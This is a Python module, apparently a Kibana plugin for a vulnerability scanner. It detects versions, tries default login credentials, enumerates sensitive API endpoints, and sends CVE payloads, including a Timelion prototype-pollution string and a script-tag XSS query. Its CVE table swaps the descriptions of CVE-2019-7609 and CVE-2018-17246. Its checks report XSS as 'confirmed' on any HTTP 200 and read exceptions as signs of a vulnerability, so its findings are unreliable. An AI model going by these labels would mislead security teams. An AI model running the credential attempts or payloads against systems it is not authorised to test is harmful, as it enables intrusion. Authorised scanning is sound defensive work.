import httpx
import asyncio
import json
import re

async def detect_protocol(scan_address, port, timeout=3):
    """
    Detects whether a service is running on HTTP or HTTPS.
    Returns the protocol string ('http' or 'https') or None if unreachable.
    """
    protocols = ['https', 'http']  # Try HTTPS first as it's more secure
    
    for protocol in protocols:
        try:
            async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
                response = await client.get(f"{protocol}://{scan_address}:{port}/")
                if response.status_code in [200, 401, 403, 302, 404]:  # Any valid HTTP response
                    return protocol
        except:
            continue
    return 'http'  # Default to HTTP if detection fails

# Kibana CVE database with verified vulnerabilities
CVE_DATABASE = {
    "CVE-2019-7609": {
        "description": "Kibana Arbitrary File Read Vulnerability",
        "severity": "HIGH",
        "affected_versions": ["<7.0.1", ">=6.5.0,<6.8.8"],
        "payload": {
            "path": "/api/console/api_server",
            "method": "POST",
            "data": {
                "requests": [
                    {
                        "method": "GET",
                        "path": "/_cluster/settings",
                        "body": ""
                    }
                ]
            }
        }
    },
    "CVE-2018-17246": {
        "description": "Kibana Remote Code Execution via Timelion",
        "severity": "CRITICAL",
        "affected_versions": ["<6.6.0"],
        "payload": {
            "path": "/api/timelion/run",
            "method": "POST",
            "data": {
                "sheet": [".es(*).props(label.__proto__.isAdmin=true)"],
                "time": {
                    "from": "now-1h",
                    "to": "now"
                }
            }
        }
    },
    "CVE-2021-22137": {
        "description": "Kibana Information Disclosure via Canvas workpad",
        "severity": "MEDIUM",
        "affected_versions": [">=7.7.0,<7.13.1", ">=7.14.0,<7.14.1"],
        "payload": {
            "path": "/api/canvas/workpad",
            "method": "GET"
        }
    },
    "CVE-2019-7608": {
        "description": "Kibana Cross-Site-Scripting (XSS) via URL",
        "severity": "MEDIUM",
        "affected_versions": ["<6.8.6", ">=7.0.0,<7.5.1"],
        "payload": {
            "path": "/app/kibana#/discover?_a=(columns:!(_source),index:'*',interval:auto,query:(language:kuery,query:%22%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E%22),sort:!('@timestamp',desc))",
            "method": "GET"
        }
    }
}

# Default credentials to test
DEFAULT_CREDENTIALS = [
    ("elastic", "changeme"),
    ("elastic", "elastic"),
    ("kibana", "changeme"),
    ("kibana", "kibana"),
    ("admin", "admin"),
    ("admin", "password")
]

def parse_version(version_string):
    """Parse version string into comparable tuple."""
    try:
        clean_version = re.match(r'^(\d+(?:\.\d+)*)', version_string.strip())
        if not clean_version:
            return (0,)
        
        parts = clean_version.group(1).split('.')
        return tuple(int(part) for part in parts)
    except (ValueError, AttributeError):
        return (0,)

def compare_versions(version1, version2):
    """Compare two version strings. Returns -1, 0, or 1."""
    v1 = parse_version(version1)
    v2 = parse_version(version2)
    
    max_len = max(len(v1), len(v2))
    v1 = v1 + (0,) * (max_len - len(v1))
    v2 = v2 + (0,) * (max_len - len(v2))
    
    if v1 < v2:
        return -1
    elif v1 > v2:
        return 1
    else:
        return 0

def is_version_affected(current_version, version_ranges):
    """Check if current version falls within affected version ranges."""
    if not current_version:
        return False
    
    try:
        for version_range in version_ranges:
            if version_range.startswith('<'):
                max_version = version_range[1:]
                if compare_versions(current_version, max_version) < 0:
                    return True
            elif '>=' in version_range and '<' in version_range:
                parts = version_range.split(',')
                min_version = parts[0][2:]
                max_version = parts[1][1:]
                if (compare_versions(current_version, min_version) >= 0 and 
                    compare_versions(current_version, max_version) < 0):
                    return True
    except Exception:
        return False
    return False

async def get_kibana_version(target_url):
    """Extract Kibana version from multiple endpoints."""
    version_info = {}
    
    # Try the main page first
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(target_url, timeout=5)
            if response.status_code == 200:
                # Look for version in HTML content
                version_match = re.search(r'"version":\s*"([^"]+)"', response.text)
                if version_match:
                    version_info['number'] = version_match.group(1)
                    return version_info
                
                # Check for version in kbn-version header
                kbn_version = response.headers.get('kbn-version')
                if kbn_version:
                    version_info['number'] = kbn_version
                    return version_info
                    
    except (httpx.RequestError, httpx.ConnectError):
        pass
    
    # Try status API endpoint
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(f"{target_url}/api/status", timeout=5)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'version' in data and 'number' in data['version']:
                        version_info['number'] = data['version']['number']
                        version_info['build_hash'] = data['version'].get('build_hash')
                        version_info['build_number'] = data['version'].get('build_number')
                        return version_info
                except json.JSONDecodeError:
                    pass
    except (httpx.RequestError, httpx.ConnectError):
        pass
    
    # Try about page
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(f"{target_url}/app/kibana#/dev_tools/console", timeout=5)
            if response.status_code == 200:
                version_match = re.search(r'Kibana\s+([0-9]+\.[0-9]+\.[0-9]+)', response.text, re.IGNORECASE)
                if version_match:
                    version_info['number'] = version_match.group(1)
                    return version_info
    except (httpx.RequestError, httpx.ConnectError):
        pass
    
    return version_info if version_info else None

async def check_exposed_ui(target_url):
    """Checks if the Kibana login page or UI is publicly accessible."""
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(target_url, timeout=5)
            if response.status_code == 200:
                content = response.text.lower()
                if any(indicator in content for indicator in ['<title>kibana</title>', 'kbn-initial-state', 'kibana', 'elastic']):
                    # Try to determine if authentication is required
                    if 'login' in content or 'username' in content or 'password' in content:
                        return {
                            "status": "INFO",
                            "vulnerability": "Kibana Login Page Exposed",
                            "target": target_url,
                            "details": "Kibana login page is accessible. Authentication appears to be enabled."
                        }
                    else:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": "Kibana UI Exposed Without Authentication",
                            "target": target_url,
                            "details": "Kibana web interface is publicly accessible without authentication. Full data access may be available."
                        }
    except (httpx.RequestError, httpx.ConnectError):
        pass
    return None

async def check_default_credentials(target_url):
    """Test common default credentials for Kibana."""
    login_url = f"{target_url}/api/security/v1/login"
    
    try:
        async with httpx.AsyncClient(follow_redirects=True) as client:
            for username, password in DEFAULT_CREDENTIALS:
                try:
                    payload = {
                        "username": username,
                        "password": password
                    }
                    response = await client.post(login_url, json=payload, timeout=5)
                    
                    # Check for successful authentication
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if 'username' in data or 'authenticated' in data:
                                return {
                                    "status": "VULNERABLE",
                                    "vulnerability": f"Kibana Default Credentials ({username}:{password})",
                                    "target": login_url,
                                    "details": f"Successfully authenticated with default credentials: {username}:{password}. Full Kibana access granted."
                                }
                        except json.JSONDecodeError:
                            pass
                    
                    # Also check for redirect-based success
                    elif response.status_code in [302, 301] and 'location' in response.headers:
                        location = response.headers['location']
                        if '/app/' in location or '/spaces/' in location:
                            return {
                                "status": "VULNERABLE",
                                "vulnerability": f"Kibana Default Credentials ({username}:{password})",
                                "target": login_url,
                                "details": f"Successfully authenticated with default credentials: {username}:{password}. Redirected to: {location}"
                            }
                    
                    await asyncio.sleep(0.5)  # Rate limiting
                    
                except httpx.RequestError:
                    continue
                    
    except (httpx.RequestError, httpx.ConnectError):
        pass
    
    return None

async def check_api_endpoints(target_url):
    """Check for exposed Kibana API endpoints."""
    vulnerabilities = []
    
    api_endpoints = [
        ("/api/status", "Status API"),
        ("/api/spaces/space", "Spaces API"),
        ("/api/security/v1/users", "User Management API"),
        ("/api/security/v1/roles", "Role Management API"),
        ("/api/saved_objects/_find", "Saved Objects API"),
        ("/api/canvas/workpad", "Canvas Workpad API"),
        ("/api/console/api_server", "Console API Server"),
        ("/api/timelion/run", "Timelion API"),
        ("/elasticsearch", "Elasticsearch Proxy"),
        ("/api/fleet/agents", "Fleet Agents API"),
        ("/api/index_patterns", "Index Patterns API")
    ]
    
    accessible_endpoints = []
    sensitive_endpoints = []
    
    for endpoint, name in api_endpoints:
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                response = await client.get(f"{target_url}{endpoint}", timeout=5)
                if response.status_code == 200:
                    accessible_endpoints.append(f"{endpoint} ({name})")
                    
                    # Check for sensitive APIs
                    if endpoint in ["/api/security/v1/users", "/api/security/v1/roles", "/api/console/api_server", "/elasticsearch"]:
                        sensitive_endpoints.append(f"{endpoint} ({name})")
                        
                elif response.status_code in [401, 403]:
                    # Authentication required - this is expected
                    continue
        except:
            continue
    
    if accessible_endpoints:
        if sensitive_endpoints:
            vulnerabilities.append({
                "status": "VULNERABLE",
                "vulnerability": "Kibana Sensitive API Exposure",
                "target": target_url,
                "details": f"Sensitive APIs accessible without authentication: {', '.join(sensitive_endpoints[:3])}{'...' if len(sensitive_endpoints) > 3 else ''}"
            })
        
        vulnerabilities.append({
            "status": "INFO",
            "vulnerability": "Kibana API Endpoints Exposed",
            "target": target_url,
            "details": f"Found {len(accessible_endpoints)} accessible API endpoints: {', '.join(accessible_endpoints[:5])}{'...' if len(accessible_endpoints) > 5 else ''}"
        })
    
    return vulnerabilities

async def test_cve_payload(target_url, cve_id, cve_data):
    """Test a specific CVE payload against Kibana."""
    payload = cve_data["payload"]
    test_url = f"{target_url}{payload['path']}"
    
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = None
            
            if payload["method"] == "GET":
                response = await client.get(test_url, timeout=5)
            elif payload["method"] == "POST":
                response = await client.post(test_url, json=payload.get("data", {}), timeout=5)
            else:
                return None
            
            # CVE-specific detection logic
            if response.status_code in [200, 201, 202]:
                response_text = response.text.lower()
                
                if cve_id == "CVE-2019-7609":  # File read vulnerability
                    if any(indicator in response_text for indicator in ["cluster_name", "settings", "persistent", "transient"]):
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Console API accessible, indicating potential file read vulnerability."
                        }
                
                elif cve_id == "CVE-2018-17246":  # Timelion RCE
                    if "timelion" in response_text or "sheet" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Timelion API accessible, critical RCE vulnerability possible."
                        }
                
                elif cve_id == "CVE-2021-22137":  # Canvas information disclosure
                    if "workpad" in response_text or "canvas" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Canvas workpad API accessible, information disclosure vulnerability."
                        }
                
                elif cve_id == "CVE-2019-7608":  # XSS vulnerability
                    if response.status_code == 200:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "XSS payload accepted. Cross-site scripting vulnerability confirmed."
                        }
                        
            elif response.status_code in [401, 403]:
                # Authentication required, may indicate patched system
                return {
                    "status": "POTENTIAL",
                    "vulnerability": f"{cve_id} - {cve_data['description']}",
                    "target": test_url,
                    "details": f"Authentication required (HTTP {response.status_code}). May indicate patched system or protected endpoint."
                }
                
    except (httpx.RequestError, httpx.ConnectError, httpx.TimeoutException):
        pass
    except Exception as e:
        # Unexpected exceptions might indicate vulnerabilities
        if cve_id in ["CVE-2018-17246", "CVE-2019-7609"]:
            return {
                "status": "POTENTIAL",
                "vulnerability": f"{cve_id} - {cve_data['description']}",
                "target": test_url,
                "details": f"Exception during testing: {str(e)[:100]}. May indicate vulnerability."
            }
    
    return None

async def check_cve_vulnerabilities(target_url):
    """Check for known CVE vulnerabilities in Kibana."""
    vulnerabilities = []
    
    # Get version information
    version_info = await get_kibana_version(target_url)
    version_number = version_info.get('number') if version_info else None
    
    # Check CVE vulnerabilities
    for cve_id, cve_data in CVE_DATABASE.items():
        if version_number and is_version_affected(version_number, cve_data["affected_versions"]):
            # Version is affected, test with payload
            result = await test_cve_payload(target_url, cve_id, cve_data)
            if result:
                result['severity'] = cve_data.get('severity', 'UNKNOWN')
                vulnerabilities.append(result)
            else:
                # Version is affected but payload didn't confirm
                vulnerabilities.append({
                    "status": "POTENTIAL",
                    "vulnerability": f"{cve_id} - {cve_data['description']}",
                    "target": target_url,
                    "severity": cve_data.get('severity', 'UNKNOWN'),
                    "details": f"Version {version_number} is affected by this CVE (severity: {cve_data.get('severity', 'UNKNOWN')}) but payload test was inconclusive. Build: {version_info.get('build_hash', 'N/A') if version_info else 'N/A'}"
                })
    
    return vulnerabilities

async def run_scans(target_obj, port):
    """Runs all defined Kibana scans against a target object."""
    scan_address = target_obj['scan_address']
    display_target = target_obj['display_target']
    resolved_ip = target_obj['resolved_ip']
    
    all_results = []
    
    protocol = await detect_protocol(scan_address, port)
    if not protocol:
        return []

    target_url = f"{protocol}://{scan_address}:{port}"
    print(f"  -> Running Kibana scans on {target_url} (for target: {display_target})")
    
    version_info = await get_kibana_version(target_url)
    service_version = version_info.get('number', 'Unknown') if version_info else 'Unknown'
    
    if not version_info:
        return []

    tasks = [
        check_exposed_ui(target_url),
        check_default_credentials(target_url),
        check_api_endpoints(target_url),
        check_cve_vulnerabilities(target_url)
    ]
    
    results_from_tasks = await asyncio.gather(*tasks)
    
    for result_group in results_from_tasks:
        if not result_group:
            continue
            
        if isinstance(result_group, list):
            for res in result_group:
                if res:
                    res.update({
                        'module': 'Kibana',
                        'service_version': service_version,
                        'target': display_target,
                        'server': scan_address,
                        'port': port,
                        'resolved_ip': resolved_ip,
                        'url': res.get('target')
                    })
                    all_results.append(res)
        elif isinstance(result_group, dict):
            result_group.update({
                'module': 'Kibana',
                'service_version': service_version,
                'target': display_target,
                'server': scan_address,
                'port': port,
                'resolved_ip': resolved_ip,
                'url': result_group.get('target')
            })
            all_results.append(result_group)
            
    return all_results
